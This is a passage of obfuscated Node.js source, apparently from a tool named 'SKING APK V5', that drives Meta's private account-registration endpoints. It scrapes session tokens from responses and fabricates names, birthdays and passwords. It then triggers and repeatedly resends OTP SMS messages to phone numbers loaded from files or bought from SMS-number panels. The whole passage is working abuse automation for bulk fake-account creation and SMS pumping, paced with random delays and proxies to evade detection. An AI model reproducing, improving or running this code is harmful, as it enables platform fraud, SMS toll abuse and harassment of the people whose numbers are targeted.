    await delay(1500, 2500), onStatus("[4/15] CP Lookup (" + v415 + ")...");
    const v461 = {};
    v461.contact_point = v415;
    const v462 = {};
    v462.context_data = v432, v462.INTERNAL__latency_qpl_marker_id = 0x2301b43, v462.INTERNAL__latency_qpl_instance_id = 0x4a2b2289b82d;
    const v463 = {};
    v463.client_input_params = v461, v463.server_params = v462;
    const v464 = await fn4("Step4", v426, "com.bloks.www.bloks.feta.rl_access.cp_lookup", JSON.stringify(v463)),
      v465 = detectForcedStep(v464),
      v466 = isAgeBlocked(v464);
    onStatus("[4/15] ✅"), await delay(1500, 2500), onStatus("[5/15] Router 1...");
    const v467 = {};
    v467.context_data = v432, v467.INTERNAL__latency_qpl_marker_id = 0x2301b43, v467.INTERNAL__latency_qpl_instance_id = 0x4a476ed0a165, v467.contact_point = v416;
    const v468 = {};
    v468.client_input_params = {}, v468.server_params = v467;
    const v469 = await fn4("Step5", v426, "com.bloks.www.rl.account_access.router.async", JSON.stringify(v468)),
      v470 = extractContextData(v469);
    if (v470) v432 = v470;
    onStatus("[5/15] ✅");
    const v471 = String(v469 || ''),
      v472 = v471.includes("send.otp") || v471.includes("send_otp") || v471.includes("meta.account.send") || v471.includes("enter_otp") || v471.includes("rl_access.enter_otp") || v471.includes("feta.rl_access.phone_confirmation");
    if (v472) {
      onStatus("[OTP-A] 📱 Existing account detected — calling send.otp.async...");
      const v565 = v432;
      let v566 = "78tewm:2";
      const v567 = v471.match(/INTERNAL_INFRA_screen_id[\\\"\\s:]+([a-z0-9]+:\d+)/i);
      if (v567) v566 = v567[1];
      try {
        const v568 = {};
        v568.context_data = v565, v568.INTERNAL_INFRA_screen_id = v566, v568.contact_point = v416, v568.contact_point_type = "PHONE_NUMBER";
        const v569 = {};
        v569.server_params = v568, await fn4("SendOTP", v426, "com.bloks.www.meta.account.send.otp.async", JSON.stringify(v569), "bloks_action", false), onStatus("[OTP-A] ✅ OTP SMS triggered via existing account login flow!");
      } catch (v570) {
        onStatus("[OTP-A] ⚠️ send.otp.async: " + v570.message + " — marking success anyway");
      }
      return debugLog(v412, "SUCCESS_LOGIN_OTP", "Existing account — send.otp.async triggered."), {
        'success': true,
        'message': "OTP sent via login flow (existing account)",
        'phone': v412,
        'lang': v421.split(',')[0]
      };
    }
    await delay(1500, 2500), onStatus("[6/15] Registration Form...");
    const v473 = extractAllContextData(v469),
      v474 = [...v473].sort((v571, v572) => v572.length - v571.length),
      v475 = v474[1] || v474[0] || v432,
      v476 = v474[0] || v432;
    let v477 = "di9gh0:8";
    const v478 = String(v469).match(/INTERNAL_INFRA_screen_id[\\"\s:]+([a-z0-9]+:\d+)/i);
    if (v478) v477 = v478[1];
    const v479 = {};
    v479.context_data = v475;
    const v480 = {};
    v480.context_data = v476, v480.INTERNAL_INFRA_screen_id = v477;
    const v481 = {};
    v481.client_input_params = v479, v481.server_params = v480;
    const v482 = await fn4("Step6", v427, "com.bloks.www.bloks.feta.rl_access.combined_registration", JSON.stringify(v481), "bloks_app"),
      v483 = String(v482 || '');
    let v484 = null;
    const v485 = v483.match(/combined_registration[\s\S]*?context_data[^\)]*?\)\s*\(dkc[^\)]*?\\*"(AT[A-Za-z0-9_\-\.\+=]{50,})\\*"/i) || v483.match(/combined_registration[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v483.match(/trigger_BloksFetaRLAccessCombinedRegistration[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    if (v485) {
      v484 = v485[1].replace(/\\/g, '');
    } else v484 = extractRegistrationContext(v482) || v476;
    onStatus("[6/15] ✅"), await delay(2000, 3000);
    const v486 = Math.floor(Date.now() / 1000),
      v487 = v412.replace(/\D/g, ''),
      v488 = "Akash@" + v487.slice(-6) + "#2026!",
      v489 = "#PWD_ENC:0:" + v486 + ':' + v488,
      v490 = 21 + Math.floor(Math.random() * 10),
      v491 = Math.floor(Math.random() * 365),
      v492 = Math.floor((Date.now() - (v490 * 365 + v491) * 86400 * 1000) / 1000);
    let v493 = 81675595300038;
    const v494 = v483.match(/36707139\s*\(eud\s*(\d{10,})\)\s*\\*?"com\.bloks\.www\.bloks\.feta\.rl_access\.async\.combined_registration/i) || v483.match(/(\d{8,})\s*\\?\(eud\s*(\d{12,})\\?\)\s*\\?"com\.bloks\.www\.bloks\.feta\.rl_access\.async\.combined_registration/i) || v483.match(/combined_registration[\s\S]*?INTERNAL__latency_qpl_instance_id[\\"\s:]+(\d{12,})/i);
    if (v494) v493 = parseInt(v494[1] || v494[2]);else {
      {
        const v573 = v483.split("com.bloks.www.bloks.feta.rl_access.async.combined_registration");
        if (v573.length > 1) {
          const v574 = v573[0].match(/(\d{12,})/g);
          v574 && v574.length > 0 && (v493 = parseInt(v574[v574.length - 1]));
        }
      }
    }
    onStatus("[7/15] Submit Details...");
    let v495 = null,
      v496 = false;
    for (let v575 = 1; v575 <= 3; v575++) {
      {
        try {
          const v578 = {};
          v578["os-age-range"] = '', v578.password = v489, v578.birthday_timestamp = v492, v578.invalid_birthday_count = 0x0;
          const v579 = {};
          v579.context_data = v484, v579.INTERNAL__latency_qpl_marker_id = 0x2301b43, v579.INTERNAL__latency_qpl_instance_id = v493, v579.should_save_login_info = 0x1;
          const v580 = {};
          v580.client_input_params = v578, v580.server_params = v579, v495 = await fn4("Step7-try" + v575, v426, "com.bloks.www.bloks.feta.rl_access.async.combined_registration", JSON.stringify(v580), "bloks_action", false);
        } catch (v581) {
          {
            onStatus("[7/15] ❌ EXCEPTION attempt " + v575 + ':\x20' + v581.message);
            if (v575 < 3) await delay(3000, 5000);
            continue;
          }
        }
        const v576 = !v495 || v495.includes("CREATE_NEW_PASSWORD:error_message") || v495.includes("\"RL_ACCOUNT_ACCESS_CREATE_NEW_PASSWORD:success\"\\s*false") || v495.includes("RL_ACCOUNT_ACCESS_CREATE_NEW_PASSWORD:success") && v495.includes("false") || v495.includes("field_exception") || v495.includes("Something went wrong") || v495.includes("Error performing query");
        if (!v576) {
          {
            onStatus("[7/15] ✅ (attempt " + v575 + ')'), v496 = true;
            break;
          }
        }
        const v577 = getErrorMsg(v495);
        onStatus("[7/15] ⚠️ attempt " + v575 + "/3 — " + (v577 || "password/details rejected"));
        if (v575 < 3) await delay(3000, 5000);
      }
    }
    if (!v496) {
      {
        onStatus("[7/15] ❌ Registration rejected by server");
        const v582 = {};
        return v582.success = false, v582.message = "Step 7 registration rejected. Check Step7-try1_full.json.", v582;
      }
    }
    await delay(1500, 2500), onStatus("[8/15] Save Login Info...");
    const v497 = String(v495 || '');
    let v498 = 81770431400005;
    const v499 = v497.match(/36707139\s*\(eud\s*(\d{10,})\)\s*\\*?"com\.bloks\.www\.bloks\.feta\.rl_access\.async\.registration\.save_login_info/i) || v497.match(/(\d{8,})\s*\\?\(eud\s*(\d{12,})\\?\)\s*\\?"com\.bloks\.www\.bloks\.feta\.rl_access\.async\.registration\.save_login_info/i) || v497.match(/save_login_info[\s\S]*?INTERNAL__latency_qpl_instance_id[\\"\s:]+(\d{12,})/i);
    if (v499) v498 = parseInt(v499[1] || v499[2]);else {
      const v583 = v497.split("registration.save_login_info");
      if (v583.length > 1) {
        {
          const v584 = v583[0].match(/(\d{12,})/g);
          v584 && v584.length > 0 && (v498 = parseInt(v584[v584.length - 1]));
        }
      }
    }
    let v500 = null;
    const v501 = v497.match(/registration\.save_login_info[\s\S]*?context_data[^\)]*?\)\s*\(dkc[^\)]*?\\*"(AT[A-Za-z0-9_\-\.\+=]{50,})\\*"/i) || v497.match(/registration\.save_login_info[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v497.match(/trigger_BloksFetaRLAccessRegistrationSaveLoginInfo[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    v501 ? v500 = v501[1].replace(/\\/g, '') : v500 = extractRegistrationContext(v495) || v484;
    const v502 = {};
    v502.context_data = v500, v502.INTERNAL__latency_qpl_marker_id = 0x2301b43, v502.INTERNAL__latency_qpl_instance_id = v498;
    const v503 = {};
    v503.client_input_params = {}, v503.server_params = v502;
    const v504 = await fn4("Step8", v426, "com.bloks.www.bloks.feta.rl_access.async.registration.save_login_info", JSON.stringify(v503));
    onStatus("[8/15] ✅"), await delay(1500, 2500), onStatus("[9/15] Router 2...");
    const v505 = String(v504 || ''),
      v506 = extractAllContextData(v505),
      v507 = [...v506].sort((v585, v586) => v586.length - v585.length);
    let v508 = v507[1] || v507[0] || v500,
      v509 = v507[0] || v500;
    const v510 = v505.match(/account_access\.router\.async[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v505.match(/trigger_BloksRLAccountAccessRouterAsync[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    if (v510) {
      v509 = v510[1].replace(/\\/g, '');
    }
    let v511 = "6tm24m:8";
    const v512 = v505.match(/INTERNAL_INFRA_screen_id[\\"\s:]+([a-z0-9]+:\d+)/i);
    if (v512) v511 = v512[1];
    const v513 = {};
    v513.context_data = v508;
    const v514 = {};
    v514.context_data = v509, v514.INTERNAL_INFRA_screen_id = v511;
    const v515 = {};
    v515.client_input_params = v513, v515.server_params = v514;
    const v516 = await fn4("Step9", v426, "com.bloks.www.rl.account_access.router.async", JSON.stringify(v515));
    onStatus("[9/15] ✅"), await delay(1500, 2500), onStatus("[11/15] Load Profile Screen...");
    const v517 = String(v516 || '');
    let v518 = null;
    const v519 = v517.match(/abra_profile_creation[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v517.match(/com\.bloks\.www\.bloks\.rl_access\.abra_profile_creation[\s\S]*?(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    if (v519) {
      v518 = v519[1].replace(/\\/g, '');
    } else v518 = extractRegistrationContext(v517) || step9Ctx;
    const v520 = await fn4("Step11", v427, "com.bloks.www.bloks.rl_access.abra_profile_creation", JSON.stringify({
      'server_params': {
        'is_directly_after_pc_flow': 0x0,
        'context_data': v518,
        'INTERNAL_INFRA_screen_id': "div8mi:6",
        'is_mux_flow': 0x0,
        'nav_bar_action': "BACK"
      }
    }), "bloks_app");
    onStatus("[11/15] ✅"), await delay(1500, 2500);
    const v521 = String(v520 || ''),
      v522 = extractAllContextData(v521);
    let v523 = null;
    const v524 = v521.match(/RL_ACCOUNT_ACCESS_ABRA_PROFILE_CREATION:serialized_context_data[\\"\s,:a-zA-Z_]+initial[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v521.match(/RL_ACCOUNT_ACCESS_ABRA_PROFILE_CREATION:serialized_context_data[^}]*?(?:initial|initial_lispy)[\\"]*:\s*\\?"(AT[A-Za-z0-9_\-\.\+=]{50,})\\?"/i);
    v524 ? (v523 = v524[1].replace(/\\/g, ''), onStatus("       ✓ Step12 client_context from r11 data")) : v523 = v522[0] || v518;
    let v525 = null,
      v526 = 957798449862312,
      v527 = "Qa2IaiqNHgWtpNw8l3LBWpVL";
    const v528 = v521.match(/aymh_device_id[^\)]*?tos_cms_id[^\)]*?context_data[^\)]*?\)\s*\(dkc\s*\\*?"([A-Za-z0-9_\-]{15,})\\*?"\s*\(eud\s*(\d+)\)\s*\\*?"(AT[A-Za-z0-9_\-\.\+=]{100,})\\*?"/i) || v521.match(/register\.with\.abra\.profile\.async[\s\S]*?\(dkc\s*\\*?"([A-Za-z0-9_\-]{15,})\\*?"\s*\(eud\s*(\d+)\)\s*\\*?"(AT[A-Za-z0-9_\-\.\+=]{100,})\\*?"/i);
    if (v528) {
      v527 = v528[1], v526 = parseInt(v528[2]), v525 = v528[3].replace(/\\/g, ''), onStatus("       ✓ Step12 server_context, device_id (" + v527 + "), tos_cms_id (" + v526 + ") from r11 action");
    } else {
      {
        const v587 = v521.match(/register\.with\.abra\.profile\.async[\s\S]*?(AT[A-Za-z0-9_\-\.\+=]{100,})/i);
        v587 ? v525 = v587[1].replace(/\\/g, '') : v525 = v522[1] || v522[0] || v518;
        const v588 = v521.match(/register\.with\.abra\.profile\.async[\s\S]*?eud\s+(\d{10,})/i) || v521.match(/tos_cms_id[^\d]*?(\d{10,})/i);
        if (v588) {
          v526 = parseInt(v588[1]);
        }
        const v589 = v521.match(/register\.with\.abra\.profile\.async[\s\S]*?([A-Za-z0-9_\-]{20,})/i);
        v589 && !v589[1].startsWith('AT') && !v589[1].startsWith("com") && (v527 = v589[1]);
      }
    }
    let v529 = 81778084900015;
    const v530 = v521.match(/36707139\s*\(eud\s*(\d{10,})\)\s*\\*?"com\.bloks\.www\.rl\.account\.register\.with\.abra\.profile\.async/i) || v521.match(/(\d{8,})\s*\\?\(eud\s*(\d{12,})\\?\)\s*\\?"com\.bloks\.www\.rl\.account\.register\.with\.abra\.profile\.async/i) || v521.match(/\\?"INTERNAL__latency_qpl_instance_id\\?"\s*:\s*(\d{12,})/);
    if (v530) {
      v529 = parseInt(v530[1] || v530[2]), onStatus("       ✓ Step12 instance_id from r11: " + v529);
    }
    let v531 = null;
    const v532 = v521.match(/RL_ACCOUNT_ACCESS_ABRA_PROFILE_CREATION_PREFILL:username[\\"\s,:a-zA-Z_]+initial[\\"\s:]+([A-Za-z0-9_\.\-]+)/i);
    v532 && v532[1] && v532[1] !== "null" && (v531 = v532[1].replace(/\\/g, '').replace(/"/g, ''), onStatus("       ✓ Step12 prefill username: " + v531));
    if (!v531) {
      {
        const v590 = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen", "Christopher", "Lisa", "Daniel", "Nancy", "Matthew", "Betty", "Anthony", "Margaret", "Mark", "Sandra"],
          v591 = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson"];
        v531 = v590[Math.floor(Math.random() * v590.length)].toLowerCase() + '_' + v591[Math.floor(Math.random() * v591.length)].toLowerCase() + Math.floor(100 + Math.random() * 899);
      }
    }
    const v533 = Math.floor(Date.now() / 1000),
      v534 = "java.lang.Object@" + Math.floor(Math.random() * 268435455).toString(16);
    onStatus("[12/15] Register Profile (@" + v531 + ")...");
    const v535 = {};
    v535.tos_cms_id = v526, v535.context_data = v525, v535.INTERNAL__latency_qpl_marker_id = 0x2301b43, v535.INTERNAL__latency_qpl_instance_id = v529, v535.aymh_device_id = v527;
    const v536 = await fn4("Step12", v426, "com.bloks.www.rl.account.register.with.abra.profile.async", JSON.stringify({
      'client_input_params': {
        'context_data': v523,
        'is_verified_from_foa_import': 0x0,
        'dbl_data': v534,
        'foa_import_source': null,
        'picture_source': "CLEAR",
        'client_consent_timestamp': v533,
        'foa_import_source_obid': null,
        'display_name': '',
        'profile_pic_url': '',
        'opt_into_marketing': 0x1,
        'username': v531
      },
      'server_params': v535
    }));
    onStatus("[12/15] ✅"), await delay(1500, 2500), onStatus("[13/15] Router 3...");
    let v537 = v525;
    const v538 = String(v536 || ''),
      v539 = v538.match(/com\.bloks\.www\.rl\.account_access\.router\.async[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v538.match(/trigger_BloksRLAccountAccessRouterAsyncControllerTypedQueryBuilder[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i) || v538.match(/context_data\\*"\s*\\*"\s*\\*"(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    if (v539) v537 = v539[1].replace(/\\/g, ''), onStatus("       ✓ Step13 context from r12 router query builder");else {
      {
        const v592 = extractAllContextData(v538);
        v592.length > 0 && (v537 = v592[0]);
      }
    }
    let v540 = 81808553800002;
    const v541 = v538.split("account_access.router.async");
    if (v541.length > 1) {
      const v593 = v541[0].match(/(\d{12,})/g);
      v593 && v593.length > 0 && (v540 = parseInt(v593[v593.length - 1]));
    }
    let v542 = "6uhuj5:4";
    const v543 = v538.match(/INTERNAL_INFRA_screen_id[\\"\s:]+([a-z0-9]+:\d+)/i) || v538.match(/phone_confirmation[\s\S]*?\\*"([a-z0-9]+:\d+)\\*"/i);
    if (v543) v542 = v543[1];
    const v544 = {};
    v544.context_data = v537, v544.INTERNAL_INFRA_screen_id = v542, v544.contact_point = v416;
    const v545 = {};
    v545.server_params = v544;
    const v546 = await fn4("Step13", v426, "com.bloks.www.rl.account_access.router.async", JSON.stringify(v545));
    onStatus("[13/15] ✅"), await delay(1500, 2500), onStatus("[14/15] Phone Confirmation Screen...");
    let v547 = v537,
      v548 = "dj5slm:4";
    const v549 = String(v546 || ''),
      v550 = v549.match(/phone_confirmation[\s\S]*?contact_point[^\)]*?context_data[^\)]*?\)\s*\(dkc[^\)]*?\\*"(AT[A-Za-z0-9_\-\.\+=]{50,})\\*"/i) || v549.match(/phone_confirmation[\s\S]*?context_data[^\)]*?\)\s*\(dkc[^\)]*?\\*"(AT[A-Za-z0-9_\-\.\+=]{50,})\\*"/i) || v549.match(/phone_confirmation[\s\S]*?context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{50,})/i);
    if (v550) v547 = v550[1].replace(/\\/g, ''), onStatus("       ✓ Step14 context from r13 phone_confirmation action");else {
      const v594 = extractAllContextData(v549);
      v594.length > 0 && (v547 = v594[0]);
    }
    const v551 = v549.match(/phone_confirmation[\s\S]*?\\*"([a-z0-9]+:\d+)\\*"/i) || v549.match(/INTERNAL_INFRA_screen_id[\\"\s:]+([a-z0-9]+:\d+)/i);
    v551 && (v548 = v551[1]);
    const v552 = {};
    v552.context_data = v547, v552.INTERNAL_INFRA_screen_id = v548, v552.contact_point = v416;
    const v553 = {};
    v553.server_params = v552;
    const v554 = await fn4("Step14", v427, "com.bloks.www.bloks.feta.rl_access.phone_confirmation", JSON.stringify(v553), "bloks_app");
    onStatus("[14/15] ✅"), await delay(1000, 2000), onStatus("[15/15] Trigger SMS (resend)...");
    let v555 = 81826277600028;
    const v556 = String(v554 || ''),
      v557 = v556.match(/(\d{12,})[\s\S]{1,150}?resend\.email\.confirmation\.code\.async/) || v556.match(/resend\.email\.confirmation\.code\.async[\s\S]{1,150}?(\d{12,})/);
    v557 && (v555 = parseInt(v557[1]));
    let v558 = v547;
    const v559 = v556.match(/resend\.email\.confirmation\.code\.async[\s\S]{1,300}?(AT[A-Za-z0-9_\-\.\+=]{100,})/) || v556.match(/context_data[\\"\s:]+(AT[A-Za-z0-9_\-\.\+=]{100,})/);
    if (v559) v558 = v559[1].replace(/\\/g, '');else {
      const v595 = extractAllContextData(v556);
      if (v595.length > 0) {
        v558 = v595[0];
      }
    }
    const v560 = {};
    v560.context_data = v558, v560.INTERNAL__latency_qpl_marker_id = 0x2301b43, v560.INTERNAL__latency_qpl_instance_id = v555;
    const v561 = {};
    v561.client_input_params = {}, v561.server_params = v560;
    const v562 = await fn4("Step15", v426, "com.bloks.www.rl.account.resend.email.confirmation.code.async", JSON.stringify(v561));
    String(v562 || '').includes("confirmation_code_resend_failure") || String(v562 || '').includes("FRL access token cannot be null") ? onStatus("[15/15] ⚠️ Resend response check — OTP screen loaded ✅") : onStatus("[15/15] ✅ — SMS sent!");
    let v563 = Math.max(0, v410.resends || 0);
    for (let v596 = 0; v596 < v563; v596++) {
      try {
        await delay(3000, 4000);
        if (v410.onLog) v410.onLog("Resending OTP to " + v412 + '\x20(' + (v596 + 1) + '/' + v563 + ')', "retry");
        onStatus("[15/15] 🔄 Resending OTP (" + (v596 + 1) + '/' + v563 + ")..."), await fn4("Step15-Resend", v426, "com.bloks.www.rl.account.resend.email.confirmation.code.async", JSON.stringify({
          'client_input_params': {},
          'server_params': {
            'context_data': v558,
            'INTERNAL__latency_qpl_marker_id': 0x2301b43,
            'INTERNAL__latency_qpl_instance_id': genQplInstanceId()
          }
        }), "bloks_action", false);
      } catch (v597) {
        onStatus("[15/15] ⚠️ Resend " + (v596 + 1) + " notice: " + v597.message);
      }
    }
    return debugLog(v412, "SUCCESS", "Registration complete — OTP screen reached."), {
      'success': true,
      'message': "Registration complete — OTP confirmation screen reached",
      'phone': v412,
      'lang': v421.split(',')[0]
    };
  } catch (v598) {
    onStatus("❌ Exception: " + v598.message), debugLog(v412, "EXCEPTION", v598.message);
    const v599 = {};
    return v599.success = false, v599.message = v598.message, v599.phone = v412, v599;
  } finally {
    {
      if (v414 && typeof v414.destroy === "function") try {
        v414.destroy();
      } catch (v600) {}
    }
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v601) {
      {
        this.totalNumbers = v601;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v602, v603, v604 = '') {
      let v605 = '';
      const v606 = v602.match(/\+?\d{8,}/),
        v607 = v606 ? v606[0] : '';
      const v608 = v604 ? chalk.gray('\x20' + v604) : '';
      if (v603 === "success") v605 = chalk.hex("#00FF88")("SK — APK │ SMS Sent → ") + chalk.hex("#FCAF45").bold(v607 || v602) + v608;else {
        if (v603 === "error" || v603 === "failed") {
          {
            let v609 = v602.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
            const v610 = v609.toLowerCase();
            if (v610.includes("socket") || v610.includes("proxy") || v610.includes("etimedout") || v610.includes("econnreset") || v610.includes("econnrefused") || v610.includes("ehostunreach") || v610.includes("enetunreach") || v610.includes("hang up") || v610.includes("timeout")) v609 = "Proxy Issue";else {
              if (v610.includes("field_exception") || v610.includes("bloks_action=null")) {
                const v611 = v609.match(/Step\s*(\d+)/i);
                v609 = v611 ? "Step " + v611[1] + " Server Exception" : "Server Exception";
              } else {
                if (v610.includes("429") || v610.includes("rate limit") || v610.includes("too many requests")) v609 = "Rate Limited";else {
                  if (v610.includes("400")) v609 = "Meta Server Issue";else {
                    if (v610.includes("403")) {
                      v609 = "Meta Server Issue";
                    } else (v610.includes("500") || v610.includes("502") || v610.includes("503")) && (v609 = "Meta Server Issue");
                  }
                }
              }
            }
            v605 = chalk.hex("#FF4466")("SK — APK │ Failed → ") + chalk.hex("#FCAF45").bold(v607) + v608 + chalk.hex("#888888")('\x20(' + v609 + ')');
          }
        } else {
          if (v603 === "retry") {
            {
              let v612 = v602.includes('(') ? v602.substring(v602.indexOf('(')) : '';
              v605 = chalk.hex("#FCAF45")("SK — APK │ Resending  → ") + chalk.hex("#FCAF45").bold(v607) + v608 + chalk.hex("#888888")('\x20' + v612);
            }
          } else return;
        }
      }
      process.stdout.write("\r[K" + v605 + '\x0a'), this.render();
    }
    ["setStatus"](v613) {}
    ["update"]() {}
    ["render"]() {
      const v614 = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1),
        v615 = '\x20\x20' + W.bold("SK-APK") + '\x20' + chalk.gray('⮞') + '\x20[' + this.processed + '/' + this.totalNumbers + ']\x20' + v614 + "% │ " + B("OK: " + this.successful) + " │ " + R("Err: " + this.failed);
      process.stdout.write("\r[K" + v615);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v616 = Math.floor((Date.now() - this.startTime) / 1000);
      const v617 = Math.floor(v616 / 60);
      const v618 = v616 % 60,
        v619 = v617 + 'm\x20' + v618 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  SKING APK V5 — COMPLETE                   ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v619.padEnd(6)) + "                       ") + C('║'));
      console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v620, v621) {
    return new Promise(v622 => {
      {
        let v623 = 0;
        process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
        if (process.stdin.isTTY) process.stdin.setRawMode(true);
        const fn5 = () => {
          process.stdout.write("[2J[H");
          printHeader();
          console.log("   [33m" + v620 + "[0m\n");
          v621.forEach((v624, v625) => {
            v625 === v623 ? console.log("   [36m➔[32m " + v624.name + "[0m") : console.log("     [90m" + v624.name + "[0m");
          });
        };
        fn5();
        const fn6 = (v626, v627) => {
          v627.ctrl && v627.name === 'c' && process.exit(0);
          if (v627.name === 'up') v623 = (v623 - 1 + v621.length) % v621.length, fn5();else {
            if (v627.name === "down") {
              v623 = (v623 + 1) % v621.length, fn5();
            } else v627.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn6), v622(v621[v623].value));
          }
        };
        process.stdin.on("keypress", fn6);
      }
    });
  }
  async function promptText(v628, v629) {
    return new Promise(v630 => {
      {
        process.stdout.write("   [33m" + v628 + "[0m ");
        let v631 = '';
        if (process.stdin.isTTY) process.stdin.setRawMode(false);
        process.stdin.resume();
        const fn7 = v632 => {
          {
            const v633 = v632.toString();
            if (v633.includes('\x0a') || v633.includes('\x0d')) {
              process.stdin.removeListener("data", fn7), v631 += v633.split(/[\r\n]/)[0];
              let v634 = v631.trim();
              if (v634.startsWith('\x22') && v634.endsWith('\x22')) v634 = v634.slice(1, -1);else v634.startsWith('\x27') && v634.endsWith('\x27') && (v634 = v634.slice(1, -1));
              v630(v634 || v629);
            } else {
              v631 += v633;
            }
          }
        };
        process.stdin.on("data", fn7);
      }
    });
  }
  async function interactiveWizard() {
    let v635 = 1;
    let v636 = "file",
      v637 = "numbers.txt",
      v638 = null,
      v639 = null,
      v640 = null,
      v641 = null,
      v642 = "none";
    let v643 = 20,
      v644 = "random",
      v645 = "random",
      v646 = 0,
      v647 = '';
    let v648 = [],
      v649 = 50,
      v650 = "/api/v1/numbers/get";
    const v651 = path.join(__dirname, ".nexa_api_key");
    while (true) {
      {
        process.stdout.write("[2J[H"), printHeader();
        if (v635 === 1) {
          const v652 = await selectOption("SELECT NUMBER SOURCE", [{
            'name': "📁 Load from file (numbers.txt)",
            'value': "file"
          }, {
            'name': "🌐 Auto fetch from NexaOTP Panel",
            'value': "nexa"
          }, {
            'name': "⚡ Auto fetch from Voltx (2oo9)",
            'value': "voltx"
          }, {
            'name': "🔥 Auto fetch from Stex (2oo9)",
            'value': "stex"
          }, {
            'name': "📱 Auto fetch from SMS Bower",
            'value': "smsbower"
          }, {
            'name': "⚡ Auto fetch from Zenex",
            'value': "zenex"
          }, {
            'name': "❌ Exit Program",
            'value': "exit"
          }]);
          if (v652 === "exit") process.exit(0);
          v636 = v652, v635 = 2;
        } else {
          if (v635 === 2) {
            {
              if (v636 === "file") {
                const v653 = await selectOption("SELECT TARGET NUMBERS FILE", [{
                  'name': "✏️ Custom File Path",
                  'value': "custom"
                }, {
                  'name': "⬅️ Go Back to Number Source",
                  'value': "back"
                }]);
                if (v653 === "back") {
                  {
                    v635 = 1;
                    continue;
                  }
                }
                if (v653 === "custom") {
                  const v654 = await promptText("Enter Numbers File Path:", "numbers.txt");
                  if (v654.toLowerCase() === "back") continue;
                  v637 = v654;
                } else v637 = v653;
                if (!fs.existsSync(v637)) fs.writeFileSync(v637, '');
                v638 = null, v635 = 3;
              } else {
                if (v636 === "voltx" || v636 === "stex") {
                  {
                    const v655 = v636 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
                      v656 = v636 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
                      v657 = v636 === "voltx" ? TWOOO_VOLTX_GET : TWOOO_STEX_GET,
                      v658 = v636 === "voltx" ? TWOOO_VOLTX_CONSOLE : TWOOO_STEX_CONSOLE;
                    let v659 = '',
                      v660 = [],
                      v661 = 50,
                      v662 = false,
                      v663 = 1;
                    while (v663 <= 3 && !v662) {
                      process.stdout.write("[2J[H"), printHeader();
                      if (v663 === 1) {
                        {
                          if (fs.existsSync(v656)) {
                            {
                              v659 = fs.readFileSync(v656, "utf8").trim();
                              const v664 = await selectOption(v655 + " key found (" + v659.substring(0, 10) + "...)", [{
                                'name': "Use saved key",
                                'value': "use"
                              }, {
                                'name': "Enter new key",
                                'value': "new"
                              }, {
                                'name': "Remove saved key",
                                'value': "remove"
                              }, {
                                'name': "⬅️ Back",
                                'value': "back"
                              }]);
                              if (v664 === "back") {
                                v662 = true;
                                break;
                              }
                              if (v664 === "remove") fs.existsSync(v656) && fs.unlinkSync(v656), v659 = '';else v664 === "new" && (v659 = '');
                            }
                          }
                          if (!v659) {
                            const v665 = await promptText("Enter " + v655 + " API Key (mauthapi):", '');
                            if (v665.toLowerCase() === "back") {
                              v662 = true;
                              break;
                            }
                            v659 = v665;
                            const v666 = {};
                            v666.name = 'No', v666.value = 'no';
                            const v667 = await selectOption("Save key?", [{
                              'name': "Yes",
                              'value': "yes"
                            }, v666]);
                            if (v667 === "yes" && v659) fs.writeFileSync(v656, v659, "utf8");
                          }
                          if (v659) v663 = 2;
                        }
                      } else {
                        if (v663 === 2) {
                          {
                            const v668 = await selectOption("How to select ranges?", [{
                              'name': "🔍 Auto Range Finder (scan console)",
                              'value': "auto"
                            }, {
                              'name': "✏️  Enter manually",
                              'value': "manual"
                            }, {
                              'name': "⬅️ Back",
                              'value': "back"
                            }]);
                            if (v668 === "back") {
                              {
                                v663 = 1;
                                continue;
                              }
                            }
                            if (v668 === "auto") {
                              const v669 = await autoRangeFinderFor2Oo(v659, v658, selectOption, promptText);
